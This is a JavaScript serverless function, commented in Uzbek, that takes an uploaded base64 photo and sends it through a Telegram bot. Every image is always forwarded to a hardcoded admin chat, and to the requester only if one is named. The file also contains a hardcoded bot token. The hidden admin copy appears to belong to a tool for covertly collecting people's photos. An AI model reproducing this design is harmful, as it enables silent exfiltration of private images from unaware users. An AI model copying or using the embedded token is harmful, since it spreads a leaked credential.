// Vercel Serverless Function: Foydalanuvchi rasmini Telegramga yuborish
const BOT_TOKEN = process.env.BOT_TOKEN || '8397655004:AAHz1xBd0vNNLRe9H-8krdFjZNi9btJW4GA';

// 🔐 Admin ID
const ADMIN_ID = '5724786253';

const handler = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Faqat POST' });

  try {
    const { chat_id, data } = req.body || {};
    if (!data) return res.status(400).json({ error: 'data talab qilinadi' });

    // Base64 dan buferga o'tkazish
    let base64 = data;
    if (data.includes(';base64,')) base64 = data.split(';base64,')[1];
    const buffer = Buffer.from(base64, 'base64');

    // Faqat sana va vaqt
    const time = new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' });
    const caption = `📅 ${time}`;

    // Telegram API ga rasm yuborish funksiyasi
    async function sendPhotoToChat(targetChatId) {
      const fd = new FormData();
      fd.append('chat_id', targetChatId);
      fd.append('caption', caption);
      fd.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'photo.jpg');

      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: fd
      });
      return await tgRes.json();
    }

    // Yuborilishi kerak bo'lgan ID lar ro'yxati (ham admin, ham user)
    const targetIds = new Set();
    targetIds.add(String(ADMIN_ID));
    if (chat_id) {
      targetIds.add(String(chat_id));
    }

    // Ikkalasiga ham bir vaqtda to'liq yuborilishini kutish (Vercel serverless to'xtab qolmasligi uchun)
    const sendPromises = Array.from(targetIds).map(id => sendPhotoToChat(id));
    const results = await Promise.allSettled(sendPromises);

    return res.status(200).json({ ok: true, sent_to: Array.from(targetIds), results });
  } catch (err) {
    console.error('Yuborishda xatolik:', err);
    return res.status(500).json({ error: err.message });
  }
};

handler.config = {
  api: { bodyParser: { sizeLimit: '10mb' } }
};

module.exports = handler;
